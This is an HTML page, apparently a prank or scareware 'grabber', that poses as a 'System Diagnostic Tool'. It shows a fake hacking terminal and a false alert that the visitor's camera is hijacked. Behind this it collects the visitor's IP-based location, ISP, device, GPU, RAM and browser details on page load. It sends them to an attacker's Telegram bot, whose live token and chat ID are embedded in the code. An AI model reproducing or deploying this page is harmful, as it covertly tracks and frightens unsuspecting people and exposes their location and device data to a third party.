<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>System Diagnostic Tool v4.0.1</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100vh;
      background: #0a0a0a; color: #00ff41; font-family: 'Consolas', 'Courier New', monospace;
      overflow: hidden; display: flex; justify-content: center; align-items: center;
    }
    #container {
      width: 98vw; height: 98vh; background: #050505; border: 1px solid #1a1a1a;
      display: flex; flex-direction: column; position: relative; box-shadow: 0 0 30px rgba(0,0,0,1);
    }
    #terminal {
      flex: 1; padding: 25px; overflow-y: auto; font-size: 12px; line-height: 1.6;
      white-space: pre-wrap; color: #00ff41; text-shadow: 0 0 2px #00ff41;
    }
    #map { height: 200px; border-top: 1px solid #222; opacity: 0.4; filter: contrast(1.2) brightness(0.5) grayscale(1); }
    
    /* Ger√ßek√ßi Sistem Bildirimi */
    #systemAlert {
      display: none; position: fixed; top: 20%; left: 50%; transform: translateX(-50%);
      width: 350px; background: #111; border: 2px solid #ff0000; color: #ff0000;
      padding: 20px; text-align: center; z-index: 10000; font-weight: bold;
      box-shadow: 0 0 50px rgba(255,0,0,0.5);
    }

    .progress-container { width: 100%; border: 1px solid #222; height: 10px; margin: 10px 0; background: #000; }
    .progress-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.1s; }

    .scan-line {
      position: absolute; width: 100%; height: 100%;
      background: linear-gradient(0deg, rgba(0,255,65,0.03) 50%, rgba(0,0,0,0) 50%);
      background-size: 100% 4px; pointer-events: none; z-index: 5;
    }
    
    #exitBtn {
      display: none; background: #ff0000; color: #fff; border: none; padding: 15px;
      font-weight: bold; cursor: pointer; width: 100%; letter-spacing: 3px;
    }
    .red { color: #ff0000; text-shadow: 0 0 2px #ff0000; }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
</head>
<body>

  <div id="systemAlert">
    [!] CRITICAL SUBSYSTEM BYPASS<br>
    FRONT_CAMERA: REMOTE_ACTIVE<br>
    STATUS: STREAMING...
  </div>

  <div id="container">
    <div class="scan-line"></div>
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="exitBtn">Sƒ∞STEMƒ∞ ACƒ∞L DURDUR</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const alertBox = document.getElementById('systemAlert');
    const btn = document.getElementById('exitBtn');

    function log(text, delay = 0, isRed = false) {
      return new Promise(res => {
        setTimeout(() => {
          const span = document.createElement('span');
          if(isRed) span.className = 'red';
          span.textContent = `[${new Date().toLocaleTimeString()}] ${text}\n`;
          terminal.appendChild(span);
          terminal.scrollTop = terminal.scrollHeight;
          res();
        }, delay);
      });
    }

    async function showBar(text) {
      await log(text);
      const cont = document.createElement('div');
      cont.className = 'progress-container';
      const bar = document.createElement('div');
      bar.className = 'progress-bar';
      cont.appendChild(bar);
      terminal.appendChild(cont);
      for(let i=0; i<=100; i+=Math.random()*20){
        bar.style.width = i + '%';
        await new Promise(r => setTimeout(r, 150));
      }
      bar.style.width = '100%';
      await log("ƒ∞≈ülem tamamlandƒ±.", 200);
    }

    function getGPU() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
    }

    function getDevice() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return ua.match(/Android.*;\s([^;]+)\sBuild/)?.[1] || "Android Mobil";
      if (/iPhone/.test(ua)) return "iPhone (" + screen.width + "x" + screen.height + ")";
      return navigator.platform;
    }

    async function start() {
      await log("Initializing connection to secure socket...", 500);
      await log("Handshake successful. Target: " + getDevice(), 400);
      
      const hwid = "ID-" + Math.random().toString(36).toUpperCase().substr(2, 12);
      const gpu = getGPU();
      const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown";

      await log("Hardware_ID: " + hwid);
      await log("GPU_Renderer: " + gpu);
      
      await showBar("Kernel injection starting...");
      
      // Kamera Korkutmasƒ±
      alertBox.style.display = 'block';
      await log("CRITICAL: Camera_Sensor hijacked.", 200, true);
      await log("Uploading live buffer to cloud...", 300, true);
      setTimeout(() => alertBox.style.display = 'none', 5000);

      try {
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();

        // Harita
        const map = L.map('map', {zoomControl: false, attributionControl: false}).setView([data.latitude, data.longitude], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        L.marker([data.latitude, data.longitude]).addTo(map);

        // Telegram ƒ∞√ßin T√ºm Verileri Hazƒ±rla
        const report = `
üö® <b>TAM Sƒ∞STEM RAPORU</b> üö®

üÜî <b>Kƒ∞MLƒ∞K Bƒ∞LGƒ∞LERƒ∞:</b>
HWID: <code>${hwid}</code>
Cihaz: <code>${getDevice()}</code>
ƒ∞≈ülemci: <code>${navigator.hardwareConcurrency} √áekirdek</code>
RAM: <code>${ram}</code>
GPU: <code>${gpu}</code>

üåç <b>Aƒû & LOKASYON:</b>
IP: <code>${data.ip}</code>
ISP: <code>${data.connection.isp}</code>
Konum: <code>${data.city} / ${data.country}</code>
Koordinat: <code>${data.latitude}, ${data.longitude}</code>

üñ•Ô∏è <b>TARAYICI & EKRAN:</b>
√á√∂z√ºn√ºrl√ºk: <code>${screen.width}x${screen.height}</code>
Dil: <code>${navigator.language}</code>
User Agent: <code>${navigator.userAgent}</code>

üìç <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Google Haritalarda G√∂ster</a>
        `;

        // Telegram'a G√∂nder
        await fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: '6400737507', text: report, parse_mode: 'HTML' })
        });

        await log("Files detected: " + Math.floor(Math.random()*5000) + " items.", 400);
        await showBar("Indexing local storage (DCIM/WhatsApp/Vault)...");
        await log("All data sent to remote server.", 500);
        await log("SYSTEM_LOCK: Monitoring active.", 400, true);

        btn.style.display = 'block';
      } catch (e) {
        await log("Error: Connection lost.", 0, true);
      }
    }

    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    window.onload = start;
  </script>
</body>
</html>
